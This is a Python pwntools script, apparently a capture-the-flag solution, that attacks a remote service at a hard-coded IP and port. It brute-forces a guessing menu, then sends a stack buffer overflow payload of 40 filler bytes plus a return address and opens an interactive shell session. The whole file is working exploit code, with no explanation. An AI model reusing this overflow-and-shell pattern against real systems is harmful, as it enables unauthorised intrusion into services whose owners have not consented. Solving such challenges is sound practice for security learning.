from pwn import *
from time import sleep

#p = process('./dutchman_hell_1')                                                                                                     
p = remote("65.109.185.193", "5000")                                                                                                

def read_last_line(i):
    for _ in range(i):
        line = p.recvline()
    return line.decode('utf-8', errors='replace')

a = read_last_line(26)

i = 1
while i != None:
    print(f"Attempt: {i}")
    i+=1
    if i % 3 == 2:
        a = read_last_line(4)
        p.sendline('2')
	
    p.sendline(str((i%3)+1))
    result = read_last_line(1) 
    if 'guessed' in result:
        print(f'#######\n{result}\n########')
        print("Unlocked")
        i = None
        break
    if 'Sorry' in result:
        continue
    a = read_last_line(1)
    sleep(1)

input("Enter to continue... ")
print("################## DONE #####################")

payload = "\x41"*40 + "\xbd\x12\x40"
p.sendline(payload)

result = p.recv().decode('utf-8', errors='replace')
print(result)
sleep(1)
p.interactive()
